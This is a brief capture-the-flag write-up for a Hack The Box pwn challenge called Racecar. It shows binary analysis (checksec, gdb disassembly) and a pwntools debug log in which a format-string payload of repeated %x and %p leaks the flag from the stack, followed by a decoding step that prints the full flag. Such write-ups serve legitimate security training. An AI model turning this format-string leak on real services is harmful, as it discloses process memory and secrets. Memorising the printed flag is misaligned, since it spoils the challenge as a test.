# RaceCar

simple pwn challenge they said

```
└──╼ $file racecar
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
```

```
└──╼ $checksec racecar
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.7.0)
[*] '/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/racecar'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x00000618  _init
0x00000650  strcmp@plt
0x00000660  read@plt
0x00000670  printf@plt
0x00000680  fgets@plt
0x00000690  time@plt
0x000006a0  sleep@plt
0x000006b0  alarm@plt
0x000006c0  __stack_chk_fail@plt
0x000006d0  malloc@plt
0x000006e0  puts@plt
0x000006f0  exit@plt
0x00000700  srand@plt
0x00000710  strlen@plt
0x00000720  __libc_start_main@plt
0x00000730  setvbuf@plt
0x00000740  fopen@plt
0x00000750  putchar@plt
0x00000760  rand@plt
0x00000770  atoi@plt
0x00000780  __cxa_finalize@plt
0x00000788  __gmon_start__@plt
0x00000790  _start
0x000007d0  __x86.get_pc_thunk.bx
0x000007e0  deregister_tm_clones
0x00000820  register_tm_clones
0x00000870  __do_global_dtors_aux
0x000008c0  frame_dummy
0x000008c9  __x86.get_pc_thunk.dx
0x000008cd  read_int
0x00000929  banner
0x00000b93  setup
0x00000c02  race_type
0x00000c91  car_menu
0x00001082  info
0x000011d2  car_info
0x00001352  menu
0x000013e1  main
0x00001490  __libc_csu_init
0x000014f0  __libc_csu_fini
0x00001500  __stack_chk_fail_local
0x00001514  _fini

(gdb) disassemble main
Dump of assembler code for function main:
   0x000013e1 <+0>:     lea    0x4(%esp),%ecx
   0x000013e5 <+4>:     and    $0xfffffff0,%esp
   0x000013e8 <+7>:     push   -0x4(%ecx)
   0x000013eb <+10>:    push   %ebp
   0x000013ec <+11>:    mov    %esp,%ebp
   0x000013ee <+13>:    push   %ebx
   0x000013ef <+14>:    push   %ecx
   0x000013f0 <+15>:    sub    $0x10,%esp
   0x000013f3 <+18>:    call   0x7d0 <__x86.get_pc_thunk.bx>
   0x000013f8 <+23>:    add    $0x2b94,%ebx
   0x000013fe <+29>:    mov    %gs:0x14,%eax
   0x00001404 <+35>:    mov    %eax,-0xc(%ebp)
   0x00001407 <+38>:    xor    %eax,%eax
   0x00001409 <+40>:    call   0xb93 <setup>
   0x0000140e <+45>:    call   0x929 <banner>
   0x00001413 <+50>:    call   0x1082 <info>
   0x00001418 <+55>:    jmp    0x1463 <main+130>
   0x0000141a <+57>:    call   0x1352 <menu>
   0x0000141f <+62>:    cmp    $0x1,%eax
   0x00001422 <+65>:    je     0x142b <main+74>
   0x00001424 <+67>:    cmp    $0x2,%eax
   0x00001427 <+70>:    je     0x1432 <main+81>
   0x00001429 <+72>:    jmp    0x1443 <main+98>
   0x0000142b <+74>:    call   0x11d2 <car_info>
   0x00001430 <+79>:    jmp    0x1463 <main+130>
   0x00001432 <+81>:    movl   $0x0,0x80(%ebx)
   0x0000143c <+91>:    call   0xc91 <car_menu>
   0x00001441 <+96>:    jmp    0x1463 <main+130>
   0x00001443 <+98>:    sub    $0x4,%esp
   0x00001446 <+101>:   lea    -0x2a54(%ebx),%eax
   0x0000144c <+107>:   push   %eax
   0x0000144d <+108>:   lea    -0x2a44(%ebx),%eax
   0x00001453 <+114>:   push   %eax
   0x00001454 <+115>:   lea    -0x2661(%ebx),%eax
   0x0000145a <+121>:   push   %eax
   0x0000145b <+122>:   call   0x670 <printf@plt>
   0x00001460 <+127>:   add    $0x10,%esp
   0x00001463 <+130>:   mov    0x80(%ebx),%eax
   0x00001469 <+136>:   test   %eax,%eax
   0x0000146b <+138>:   jne    0x141a <main+57>
   0x0000146d <+140>:   nop
   0x0000146e <+141>:   mov    -0xc(%ebp),%eax
   0x00001471 <+144>:   xor    %gs:0x14,%eax
   0x00001478 <+151>:   je     0x147f <main+158>
   0x0000147a <+153>:   call   0x1500 <__stack_chk_fail_local>
   0x0000147f <+158>:   lea    -0x8(%ebp),%esp
   0x00001482 <+161>:   pop    %ecx
   0x00001483 <+162>:   pop    %ebx
   0x00001484 <+163>:   pop    %ebp
--Type <RET> for more, q to quit, c to continue without paging--
   0x00001485 <+164>:   lea    -0x4(%ecx),%esp
   0x00001488 <+167>:   ret    
End of assembler dump.
```

format strin vulnerability in `printf()` in `race_menu` function

the flag is in the stack

```
└──╼ $python exploit.py
[+] Opening connection to 138.68.129.154 on port 31614: Done
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("Name")
[DEBUG] Sent 0x5 bytes:
    b'Name\n'
[DEBUG] Received 0x438 bytes:
    00000000  0a f0 9f 8e  8c f0 9f 8e  8c f0 9f 8e  8c f0 9f 8e  │····│····│····│····│
    00000010  8c f0 9f 8e  8c f0 9f 8e  8c f0 9f 8e  8c f0 9f 8e  │····│····│····│····│
    *
    00000070  8c 0a 1b 5b  31 3b 33 34  6d 20 20 20  20 20 20 5f  │···[│1;34│m   │   _│
    00000080  5f 5f 5f 5f  5f 20 20 20  20 20 20 20  20 20 20 20  │____│_   │    │    │
    00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000a0  20 20 20 20  20 20 20 20  20 20 20 20  1b 5b 31 3b  │    │    │    │·[1;│
    000000b0  33 35 6d 7c  78 78 78 7c  0a 1b 5b 31  3b 33 34 6d  │35m|│xxx|│··[1│;34m│
    000000c0  20 20 20 20  20 2f 7c 5f  7c 7c 5f 5c  60 2e 5f 5f  │    │ /|_│||_\│`.__│
    000000d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000f0  20 20 20 1b  5b 31 3b 33  35 6d 7c 20  46 20 7c 0a  │   ·│[1;3│5m| │F |·│
    00000100  1b 5b 31 3b  33 34 6d 20  20 20 20 28  20 20 20 5f  │·[1;│34m │   (│   _│
    00000110  20 20 20 20  5f 20 5f 5c  20 20 20 20  20 20 20 20  │    │_ _\│    │    │
    00000120  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000130  20 20 20 20  20 20 20 20  20 20 1b 5b  31 3b 33 35  │    │    │  ·[│1;35│
    00000140  6d 7c 78 78  78 7c 0a 1b  5b 31 3b 33  34 6d 2a 2a  │m|xx│x|··│[1;3│4m**│
    00000150  2a 20 3d 60  2d 28 5f 29  2d 2d 28 5f  29 2d 27 20  │* =`│-(_)│--(_│)-' │
    00000160  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000180  20 1b 5b 31  3b 33 35 6d  7c 20 49 20  7c 0a 20 20  │ ·[1│;35m│| I │|·  │
    00000190  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000001c0  20 1b 5b 31  3b 33 35 6d  7c 78 78 78  7c 0a 20 20  │ ·[1│;35m│|xxx│|·  │
    000001d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000200  20 1b 5b 31  3b 33 35 6d  7c 20 4e 20  7c 0a 20 20  │ ·[1│;35m│| N │|·  │
    00000210  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000240  20 1b 5b 31  3b 33 35 6d  7c 78 78 78  7c 0a 20 20  │ ·[1│;35m│|xxx│|·  │
    00000250  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000280  20 1b 5b 31  3b 33 35 6d  7c 20 49 20  7c 0a 20 20  │ ·[1│;35m│| I │|·  │
    00000290  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000002c0  20 1b 5b 31  3b 33 35 6d  7c 78 78 78  7c 0a 1b 5b  │ ·[1│;35m│|xxx│|··[│
    000002d0  31 3b 33 31  6d 20 20 20  20 20 20 20  20 20 20 20  │1;31│m   │    │    │
    000002e0  20 20 5f 2d  5f 2d 20 20  5f 2f 5c 5f  5f 5f 5f 5f  │  _-│_-  │_/\_│____│
    000002f0  5f 5c 5f 5f  20 20 20 20  20 20 20 20  20 20 20 20  │_\__│    │    │    │
    00000300  20 20 20 20  20 20 20 20  1b 5b 31 3b  33 35 6d 7c  │    │    │·[1;│35m|│
    00000310  20 53 20 7c  0a 1b 5b 31  3b 33 31 6d  20 20 20 20  │ S |│··[1│;31m│    │
    00000320  20 20 20 20  20 20 20 5f  2d 5f 2d 5f  5f 20 2f 20  │    │   _│-_-_│_ / │
    00000330  2c 2d 2e 20  2d 7c 2d 20  20 2c 2d 2e  60 2d 2e 20  │,-. │-|- │ ,-.│`-. │
    00000340  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 1b  │    │    │    │   ·│
    00000350  5b 31 3b 33  35 6d 7c 78  78 78 7c 0a  1b 5b 31 3b  │[1;3│5m|x│xx|·│·[1;│
    00000360  33 31 6d 20  20 20 20 20  20 20 20 20  20 20 20 5f  │31m │    │    │   _│
    00000370  2d 5f 2d 20  60 28 20 6f  20 29 2d 2d  2d 2d 28 20  │-_- │`( o│ )--│--( │
    00000380  6f 20 29 2d  27 20 20 20  20 20 20 20  20 20 20 20  │o )-│'   │    │    │
    00000390  20 20 20 20  20 20 1b 5b  31 3b 33 35  6d 7c 20 48  │    │  ·[│1;35│m| H│
    000003a0  20 7c 0a 1b  5b 31 3b 33  31 6d 20 20  20 20 20 20  │ |··│[1;3│1m  │    │
    000003b0  20 20 20 20  20 20 20 20  20 20 20 20  20 60 2d 27  │    │    │    │ `-'│
    000003c0  20 20 20 20  20 20 60 2d  27 20 20 20  20 20 20 20  │    │  `-│'   │    │
    000003d0  20 20 20 20  20 20 20 20  20 20 20 20  20 1b 5b 31  │    │    │    │ ·[1│
    000003e0  3b 33 35 6d  7c 78 78 78  7c 0a f0 9f  8e 8c f0 9f  │;35m│|xxx│|···│····│
    000003f0  8e 8c f0 9f  8e 8c f0 9f  8e 8c f0 9f  8e 8c f0 9f  │····│····│····│····│
    *
    00000430  8e 8c f0 9f  8e 8c f0 9f                            │····│····│
    00000438
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("Nickname")
[DEBUG] Sent 0x9 bytes:
    b'Nickname\n'
[DEBUG] Received 0x4e bytes:
    00000000  8e 8c f0 9f  8e 8c f0 9f  8e 8c f0 9f  8e 8c f0 9f  │····│····│····│····│
    *
    00000020  8e 8c 0a 0a  1b 5b 31 3b  33 36 6d 49  6e 73 65 72  │····│·[1;│36mI│nser│
    00000030  74 20 79 6f  75 72 20 64  61 74 61 3a  0a 0a 4e 61  │t yo│ur d│ata:│··Na│
    00000040  6d 65 3a 20  4e 69 63 6b  6e 61 6d 65  3a 20        │me: │Nick│name│: │
    0000004e
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("2")
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0xc4 bytes:
    00000000  0a 1b 5b 31  3b 33 32 6d  5b 2b 5d 20  57 65 6c 63  │··[1│;32m│[+] │Welc│
    00000010  6f 6d 65 20  5b 1b 5b 31  3b 33 33 6d  4e 61 6d 65  │ome │[·[1│;33m│Name│
    00000020  1b 5b 31 3b  33 32 6d 5d  21 0a 0a 1b  5b 31 3b 33  │·[1;│32m]│!···│[1;3│
    00000030  36 6d 5b 2a  5d 20 59 6f  75 72 20 6e  61 6d 65 20  │6m[*│] Yo│ur n│ame │
    00000040  69 73 20 5b  1b 5b 31 3b  33 33 6d 4e  61 6d 65 1b  │is [│·[1;│33mN│ame·│
    00000050  5b 31 3b 33  36 6d 5d 20  62 75 74 20  65 76 65 72  │[1;3│6m] │but │ever│
    00000060  79 62 6f 64  79 20 63 61  6c 6c 73 20  79 6f 75 2e  │ybod│y ca│lls │you.│
    00000070  2e 20 5b 1b  5b 31 3b 33  33 6d 4e 69  63 6b 6e 61  │. [·│[1;3│3mNi│ckna│
    00000080  6d 65 1b 5b  31 3b 33 36  6d 5d 21 0a  5b 2a 5d 20  │me·[│1;36│m]!·│[*] │
    00000090  43 75 72 72  65 6e 74 20  63 6f 69 6e  73 3a 20 5b  │Curr│ent │coin│s: [│
    000000a0  36 39 5d 0a  0a 31 2e 20  43 61 72 20  69 6e 66 6f  │69]·│·1. │Car │info│
    000000b0  0a 32 2e 20  43 61 72 20  73 65 6c 65  63 74 69 6f  │·2. │Car │sele│ctio│
    000000c0  6e 0a 3e 20                                         │n·> │
    000000c4
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("1")
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x23 bytes:
    00000000  0a 0a 53 65  6c 65 63 74  20 63 61 72  3a 0a 31 2e  │··Se│lect│ car│:·1.│
    00000010  20 f0 9f 9a  97 0a 32 2e  20 f0 9f 8f  8e ef b8 8f  │ ···│··2.│ ···│····│
    00000020  0a 3e 20                                            │·> │
    00000023
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("2")
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x2e bytes:
    b'\n'
    b'\n'
    b'Select race:\n'
    b'1. Highway battle\n'
    b'2. Circuit\n'
    b'> '
/home/nair0lf32/Desktop/Stuff/HTB/challenges/Racecar/exploit.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---")
[DEBUG] Sent 0x3a bytes:
    b'%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---\n'
[DEBUG] Received 0xc5 bytes:
    00000000  0a 5b 2a 5d  20 57 61 69  74 69 6e 67  20 66 6f 72  │·[*]│ Wai│ting│ for│
    00000010  20 74 68 65  20 72 61 63  65 20 74 6f  20 66 69 6e  │ the│ rac│e to│ fin│
    00000020  69 73 68 2e  2e 2e 1b 5b  31 3b 33 32  6d 0a 0a 5b  │ish.│..·[│1;32│m··[│
    00000030  2b 5d 20 59  6f 75 20 77  6f 6e 20 74  68 65 20 72  │+] Y│ou w│on t│he r│
    00000040  61 63 65 21  21 20 59 6f  75 20 67 65  74 20 31 30  │ace!│! Yo│u ge│t 10│
    00000050  30 20 63 6f  69 6e 73 21  0a 5b 2b 5d  20 43 75 72  │0 co│ins!│·[+]│ Cur│
    00000060  72 65 6e 74  20 63 6f 69  6e 73 3a 20  5b 31 36 39  │rent│ coi│ns: │[169│
    00000070  5d 1b 5b 31  3b 33 36 6d  0a 0a 5b 21  5d 20 44 6f  │]·[1│;36m│··[!│] Do│
    00000080  20 79 6f 75  20 68 61 76  65 20 61 6e  79 74 68 69  │ you│ hav│e an│ythi│
    00000090  6e 67 20 74  6f 20 73 61  79 20 74 6f  20 74 68 65  │ng t│o sa│y to│ the│
    000000a0  20 70 72 65  73 73 20 61  66 74 65 72  20 79 6f 75  │ pre│ss a│fter│ you│
    000000b0  72 20 62 69  67 20 76 69  63 74 6f 72  79 3f 0a 3e  │r bi│g vi│ctor│y?·>│
    000000c0  20 1b 5b 30  6d                                     │ ·[0│m│
    000000c5
b'\n[*] Waiting for the race to finish...\x1b[1;32m\n\n[+] You won the race!! You get 100 coins!\n[+] Current coins: [169]\x1b[1;36m\n\n[!] Do you have anything to say to the press after your big victory?\n> \x1b[0m'
[*] Switching to interactive mode
[DEBUG] Received 0x116 bytes:
    00000000  0a 1b 5b 33  6d 54 68 65  20 4d 61 6e  2c 20 74 68  │··[3│mThe│ Man│, th│
    00000010  65 20 4d 79  74 68 2c 20  74 68 65 20  4c 65 67 65  │e My│th, │the │Lege│
    00000020  6e 64 21 20  54 68 65 20  67 72 61 6e  64 20 77 69  │nd! │The │gran│d wi│
    00000030  6e 6e 65 72  20 6f 66 20  74 68 65 20  72 61 63 65  │nner│ of │the │race│
    00000040  20 77 61 6e  74 73 20 74  68 65 20 77  68 6f 6c 65  │ wan│ts t│he w│hole│
    00000050  20 77 6f 72  6c 64 20 74  6f 20 6b 6e  6f 77 20 74  │ wor│ld t│o kn│ow t│
    00000060  68 69 73 3a  20 1b 5b 30  6d 0a 35 37  64 36 66 31  │his:│ ·[0│m·57│d6f1│
    00000070  63 30 31 37  30 35 36 35  62 38 64 38  35 38 31 35  │c017│0565│b8d8│5815│
    00000080  32 36 31 32  35 36 35 62  39 39 36 63  35 37 64 36  │2612│565b│996c│57d6│
    00000090  66 31 63 30  35 37 64 36  66 33 34 30  2d 2d 2d 46  │f1c0│57d6│f340│---F│
    000000a0  4c 41 47 3a  20 30 78 37  62 34 32 35  34 34 38 30  │LAG:│ 0x7│b425│4480│
    000000b0  78 35 66 37  39 36 38 37  37 30 78 35  66 36 34 33  │x5f7│9687│70x5│f643│
    000000c0  31 36 34 30  78 33 34 37  33 35 66 33  31 30 78 37  │1640│x347│35f3│10x7│
    000000d0  34 35 66 33  33 37 36 30  78 36 36 35  66 33 33 36  │45f3│3760│x665│f336│
    000000e0  38 30 78 35  66 36 37 33  34 36 63 30  78 37 34 35  │80x5│f673│46c0│x745│
    000000f0  66 36 65 33  30 30 78 33  35 35 66 33  33 36 38 30  │f6e3│00x3│55f3│3680│
    00000100  78 36 62 36  33 33 34 37  34 30 78 37  64 32 31 33  │x6b6│3347│40x7│d213│
    00000110  66 20 2d 2d  2d 0a                                  │f --│-·│
    00000116

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
57d6f1c0170565b8d858152612565b996c57d6f1c057d6f340---FLAG: 0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f ---
[*] Got EOF while reading in interactive
$  
```

```
└──╼ $python decode.py
b'HTB{'
b'HTB{why_'
b'HTB{why_d1d_'
b'HTB{why_d1d_1_s4'
b'HTB{why_d1d_1_s4v3_t'
b'HTB{why_d1d_1_s4v3_th3_f'
b'HTB{why_d1d_1_s4v3_th3_fl4g_'
b'HTB{why_d1d_1_s4v3_th3_fl4g_0n_t'
b'HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5'
b'HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck'
b'HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00'
```
